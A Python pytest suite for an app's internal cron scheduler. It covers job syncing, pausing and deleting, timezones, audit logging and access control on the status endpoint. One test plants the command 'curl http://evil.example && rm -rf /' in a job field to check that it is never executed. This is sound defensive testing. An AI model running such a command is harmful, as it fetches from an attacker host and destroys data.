"""Phase 5: internal scheduler tests.

The app-level scheduler is disabled during the suite (see conftest); these
tests instantiate ``CronScheduler`` directly and drive its callback
``run_scheduled_job`` for deterministic, sleep-free coverage of:

- stable ids and non-duplication of jobs
- sync eligibility (paused/deleted/disabled-script jobs are never armed)
- edit → schedule update, pause/delete → schedule removal
- boot only registers (next run is in the future; nothing executes now)
- timezone handling
- the scheduled execution pipeline reuses the Phase 4 execution service
  (origin ``scheduled``, system actor, no user session)
- one-run-at-a-time guard + audit trail entries
- status endpoint RBAC
"""

import subprocess
import sys
import datetime
from zoneinfo import ZoneInfo

import pytest

from app.core import audit_actions as AuditAction
from app.core.config import settings
from app.core.permissions import Permission, get_role_permissions
from app.models.audit_log import AuditLog
from app.models.execution import Execution
from app.repositories.execution_repository import ExecutionRepository
from app.scheduler import jobs as scheduler_jobs
from app.scheduler import registry as scheduler_registry
from app.scheduler.service import CronScheduler, JOB_ID_PREFIX, job_id_for

HI_SOURCE = "import sys; sys.stdout.write('hola desde el scheduler'); sys.stderr.write(''); sys.exit(0)"

JOB_PAYLOAD = {
    "name": "Tarea programada",
    "command": "/ruta/placeholder/script.sh",
    "schedule_expression": "0 2 * * *",
}


def _make_script(client, auth_headers, isolated_allowlist, name, content=HI_SOURCE, enabled=True):
    path = isolated_allowlist / f"{name}.py"
    path.write_text(content, encoding="utf-8")
    resp = client.post(
        "/api/scripts", json={"name": name, "path": str(path)}, headers=auth_headers
    )
    assert resp.status_code == 201, resp.text
    script_id = resp.json()["id"]
    if not enabled:
        resp2 = client.put(
            f"/api/scripts/{script_id}", json={"is_enabled": False}, headers=auth_headers
        )
        assert resp2.status_code == 200, resp2.text
    return path, script_id


def _make_job(client, headers, name, script_id=None, **overrides):
    payload = {**JOB_PAYLOAD, "name": name, **overrides}
    if script_id is not None:
        payload["script_id"] = script_id
    resp = client.post("/api/cron-jobs", json=payload, headers=headers)
    assert resp.status_code == 201, resp.text
    return resp.json()["id"]


def _audit_for(db_session, action):
    return (
        db_session.query(AuditLog)
        .filter(AuditLog.action == action)
        .order_by(AuditLog.id.desc())
        .all()
    )


def _executions_for(db_session, cron_job_id):
    return (
        db_session.query(Execution)
        .filter(Execution.cron_job_id == cron_job_id)
        .order_by(Execution.id.asc())
        .all()
    )


@pytest.fixture()
def running_scheduler():
    """A real CronScheduler bound to the process registry, started and
    deterministically shut down. Mirrors what the lifespan does for the app."""
    scheduler = CronScheduler()
    scheduler.start()
    previous = scheduler_registry.get_scheduler()
    scheduler_registry.bind(scheduler)
    yield scheduler
    scheduler.shutdown()
    scheduler_registry.bind(previous)


# ---------------------------------------------------------------------------
# Configuration and RBAC
# ---------------------------------------------------------------------------

def test_scheduler_configuration_defaults():
    assert settings.SCHEDULER_TIMEZONE == "America/Lima"
    assert settings.SCHEDULER_MISFIRE_GRACE_SECONDS > 0
    assert settings.SCHEDULER_SYNC_INTERVAL_SECONDS > 0


def test_scheduler_read_permission_is_admin_only():
    assert Permission.SCHEDULER_READ == "scheduler.read"
    assert Permission.SCHEDULER_READ in get_role_permissions("admin")
    assert Permission.SCHEDULER_READ not in get_role_permissions("operator")
    assert Permission.SCHEDULER_READ not in get_role_permissions("viewer")


# ---------------------------------------------------------------------------
# Job mapping: stable ids, no duplicates, invalid expressions, tz
# ---------------------------------------------------------------------------

def test_job_identifier_is_stable_logical_id():
    assert job_id_for(42) == f"{JOB_ID_PREFIX}:42"
    assert job_id_for(1) != job_id_for(2)


def test_add_or_replace_never_duplicates_a_job(db_session):
    scheduler = CronScheduler()
    scheduler.start()
    try:
        assert scheduler.add_or_replace(7, "5 * * * *") is True
        assert scheduler.add_or_replace(7, "9 * * * *") is True
        assert scheduler.armed_count() == 1
        scheduler.add_or_replace(8, "5 * * * *")
        assert scheduler.armed_count() == 2
    finally:
        scheduler.shutdown()


def test_add_or_replace_rejects_unschedulable_expression(db_session):
    scheduler = CronScheduler()
    scheduler.start()
    try:
        assert scheduler.add_or_replace(9, "not a cron expression") is False
        assert scheduler.armed_count() == 0
    finally:
        scheduler.shutdown()


def test_registration_never_runs_immediately_and_respects_timezone(db_session):
    """Armed right now -> next run is in the future, interpreted in the
    configured local time zone (no UTC conversion surprises)."""
    scheduler = CronScheduler()
    scheduler.start()
    try:
        assert scheduler.timezone == settings.SCHEDULER_TIMEZONE

        scheduler.add_or_replace(10, "0 2 * * *")
        next_run = scheduler.next_run(10)
        assert next_run is not None
        assert next_run > datetime.datetime.now(datetime.timezone.utc)
        assert next_run.hour == 2
        zone = ZoneInfo(settings.SCHEDULER_TIMEZONE)
        assert next_run.utcoffset() == zone.utcoffset(next_run)

        scheduler.add_or_replace(11, "7 3 * * *")
        assert scheduler.next_run(11) is not None
    finally:
        scheduler.shutdown()


# ---------------------------------------------------------------------------
# Sync from the database (source of truth)
# ---------------------------------------------------------------------------

def test_sync_arms_only_eligible_jobs(
    client, seeded_db, auth_headers, isolated_allowlist
):
    _, script_ok = _make_script(client, auth_headers, isolated_allowlist, "e-ok")
    _, script_off = _make_script(
        client, auth_headers, isolated_allowlist, "e-off", enabled=False
    )

    active_job = _make_job(client, auth_headers, "e-active", script_ok)
    paused_job = _make_job(client, auth_headers, "e-paused", script_ok)
    client.patch(f"/api/cron-jobs/{paused_job}/status", json={"is_active": False}, headers=auth_headers)

    deleted_job = _make_job(client, auth_headers, "e-deleted", script_ok)
    client.delete(f"/api/cron-jobs/{deleted_job}", headers=auth_headers)

    disabled_script_job = _make_job(client, auth_headers, "e-disabled-script", script_off)
    no_script_job = _make_job(client, auth_headers, "e-no-script")

    scheduler = CronScheduler()
    scheduler.start()
    try:
        counted = scheduler.sync_from_db()
        assert counted == 1
        assert scheduler.next_run(active_job) is not None
        for job_id in (paused_job, deleted_job, disabled_script_job, no_script_job):
            assert scheduler.next_run(job_id) is None
    finally:
        scheduler.shutdown()


def test_sync_removes_stale_job_when_script_disabled(
    client, seeded_db, auth_headers, isolated_allowlist
):
    _, script_id = _make_script(client, auth_headers, isolated_allowlist, "e-stale")
    job_id = _make_job(client, auth_headers, "e-stale-job", script_id)

    scheduler = CronScheduler()
    scheduler.start()
    try:
        assert scheduler.sync_from_db() == 1
        assert scheduler.next_run(job_id) is not None

        client.put(
            f"/api/scripts/{script_id}",
            json={"is_enabled": False},
            headers=auth_headers,
        )
        scheduler.sync_from_db()
        assert scheduler.next_run(job_id) is None
    finally:
        scheduler.shutdown()


def test_edit_updates_schedule_and_pause_delete_remove(
    client, seeded_db, auth_headers, isolated_allowlist, running_scheduler
):
    _, script_id = _make_script(client, auth_headers, isolated_allowlist, "e-edit")
    job_id = _make_job(client, auth_headers, "e-edit-job", script_id)

    first = running_scheduler.next_run(job_id)
    assert first is not None and first.hour == 2

    client.put(
        f"/api/cron-jobs/{job_id}",
        json={"schedule_expression": "0 5 * * *"},
        headers=auth_headers,
    )
    updated = running_scheduler.next_run(job_id)
    assert updated is not None and updated.hour == 5

    client.patch(f"/api/cron-jobs/{job_id}/status", json={"is_active": False}, headers=auth_headers)
    assert running_scheduler.next_run(job_id) is None

    client.patch(f"/api/cron-jobs/{job_id}/status", json={"is_active": True}, headers=auth_headers)
    assert running_scheduler.next_run(job_id) is not None

    client.delete(f"/api/cron-jobs/{job_id}", headers=auth_headers)
    assert running_scheduler.next_run(job_id) is None


# ---------------------------------------------------------------------------
# The scheduled execution pipeline (deterministic: no sleeping)
# ---------------------------------------------------------------------------

def test_run_scheduled_job_executes_via_execution_service(
    client, seeded_db, auth_headers, isolated_allowlist, db_session
):
    _, script_id = _make_script(client, auth_headers, isolated_allowlist, "s-ok")
    job_id = _make_job(client, auth_headers, "s-exec", script_id)

    scheduler_jobs.run_scheduled_job(job_id)

    rows = _executions_for(db_session, job_id)
    assert len(rows) == 1
    execution = rows[0]
    assert execution.trigger == "scheduled"
    assert execution.status == "success"
    assert execution.exit_code == 0
    assert "hola desde el scheduler" in (execution.stdout or "")
    # No user session involved: the acting username is the system actor.
    assert execution.username == "system"
    assert execution.ip_address is None

    started = _audit_for(db_session, AuditAction.EXECUTION_STARTED)
    assert started and started[0].resource_id == str(execution.id)
    assert started[0].username == "system"
    assert started[0].user_id is None
    assert _audit_for(db_session, AuditAction.EXECUTION_SUCCEEDED)


def test_run_scheduled_job_uses_only_registered_script(
    client, seeded_db, auth_headers, isolated_allowlist, monkeypatch, db_session
):
    _, script_id = _make_script(client, auth_headers, isolated_allowlist, "s-isolated")
    job_id = _make_job(
        client,
        auth_headers,
        "s-isolated-job",
        script_id,
        command="curl http://evil.example && rm -rf /",
    )

    calls = []

    class _FakeResult:
        returncode = 0
        stdout = b"ok\n"
        stderr = b""

    def _spy(args, *extra, **kwargs):
        calls.append((list(args), kwargs))
        return _FakeResult()

    monkeypatch.setattr(subprocess, "run", _spy)
    scheduler_jobs.run_scheduled_job(job_id)

    assert len(calls) == 1
    argv, kwargs = calls[0]
    assert argv == [sys.executable, str(isolated_allowlist / "s-isolated.py")]
    assert kwargs.get("shell") is not True
    assert all("curl" not in arg and "rm " not in arg for arg in argv)


def test_run_scheduled_job_skips_when_already_running(
    client, seeded_db, auth_headers, isolated_allowlist, db_session
):
    _, script_id = _make_script(client, auth_headers, isolated_allowlist, "s-run")
    job_id = _make_job(client, auth_headers, "s-running", script_id)

    ExecutionRepository(db_session).add(
        Execution(
            cron_job_id=job_id,
            script_id=script_id,
            trigger="manual",
            status="running",
            username="somebody",
        )
    )

    scheduler_jobs.run_scheduled_job(job_id)

    assert len(_executions_for(db_session, job_id)) == 1
    skipped = _audit_for(db_session, AuditAction.EXECUTION_SKIPPED)
    assert skipped
    assert "already running" in (skipped[0].details or "")
    assert skipped[0].username == "system"
    assert skipped[0].user_id is None


def test_run_scheduled_job_ignores_paused_job(
    client, seeded_db, auth_headers, isolated_allowlist, db_session
):
    _, script_id = _make_script(client, auth_headers, isolated_allowlist, "s-paused")
    job_id = _make_job(client, auth_headers, "s-pause", script_id)
    client.patch(f"/api/cron-jobs/{job_id}/status", json={"is_active": False}, headers=auth_headers)

    scheduler_jobs.run_scheduled_job(job_id)

    assert _executions_for(db_session, job_id) == []
    assert not _audit_for(db_session, AuditAction.EXECUTION_SKIPPED)


def test_run_scheduled_job_ignores_deleted_job(
    client, seeded_db, auth_headers, isolated_allowlist, db_session
):
    _, script_id = _make_script(client, auth_headers, isolated_allowlist, "s-del")
    job_id = _make_job(client, auth_headers, "s-deleted", script_id)
    client.delete(f"/api/cron-jobs/{job_id}", headers=auth_headers)

    scheduler_jobs.run_scheduled_job(job_id)

    assert _executions_for(db_session, job_id) == []


def test_run_scheduled_job_skips_disabled_script(
    client, seeded_db, auth_headers, isolated_allowlist, db_session
):
    _, script_id = _make_script(
        client, auth_headers, isolated_allowlist, "s-off", enabled=False
    )
    job_id = _make_job(client, auth_headers, "s-off-job", script_id)

    scheduler_jobs.run_scheduled_job(job_id)

    assert _executions_for(db_session, job_id) == []
    skipped = _audit_for(db_session, AuditAction.EXECUTION_SKIPPED)
    assert skipped
    assert "script" in (skipped[0].details or "")


# ---------------------------------------------------------------------------
# API: status endpoint and next-run/last-run enrichment
# ---------------------------------------------------------------------------

def test_status_endpoint_requires_authentication(client):
    assert client.get("/api/scheduler/status").status_code == 401
    assert client.get(
        "/api/scheduler/status",
        headers={"Authorization": "Bearer invalid.token.here"},
    ).status_code == 401


def test_status_endpoint_reports_disabled_scheduler(client, auth_headers):
    resp = client.get("/api/scheduler/status", headers=auth_headers)
    assert resp.status_code == 200
    body = resp.json()
    assert body["running"] is False
    assert body["jobs_registered"] == 0
    assert body["timezone"] == settings.SCHEDULER_TIMEZONE


def test_status_endpoint_reports_running_scheduler(client, auth_headers, running_scheduler):
    resp = client.get("/api/scheduler/status", headers=auth_headers)
    assert resp.status_code == 200
    body = resp.json()
    assert body["running"] is True
    assert body["timezone"] == settings.SCHEDULER_TIMEZONE
    assert body["jobs_registered"] == running_scheduler.armed_count()


def test_status_endpoint_denied_for_operator(client, seeded_db, operator_headers):
    resp = client.get("/api/scheduler/status", headers=operator_headers)
    assert resp.status_code == 403


def test_cron_job_response_includes_next_and_last_run(
    client, seeded_db, auth_headers, isolated_allowlist, running_scheduler, db_session
):
    _, script_id = _make_script(client, auth_headers, isolated_allowlist, "s-next")
    job_id = _make_job(client, auth_headers, "s-next-job", script_id)

    listed = client.get("/api/cron-jobs", headers=auth_headers).json()
    row = next(item for item in listed if item["id"] == job_id)
    assert row["next_run_at"] is not None
    assert row["last_execution_status"] is None

    client.post(f"/api/cron-jobs/{job_id}/execute", headers=auth_headers)

    detail = client.get(f"/api/cron-jobs/{job_id}", headers=auth_headers).json()
    assert detail["last_execution_status"] == "success"
    assert detail["last_execution_at"] is not None

    client.patch(f"/api/cron-jobs/{job_id}/status", json={"is_active": False}, headers=auth_headers)
    paused = client.get(f"/api/cron-jobs/{job_id}", headers=auth_headers).json()
    assert paused["next_run_at"] is None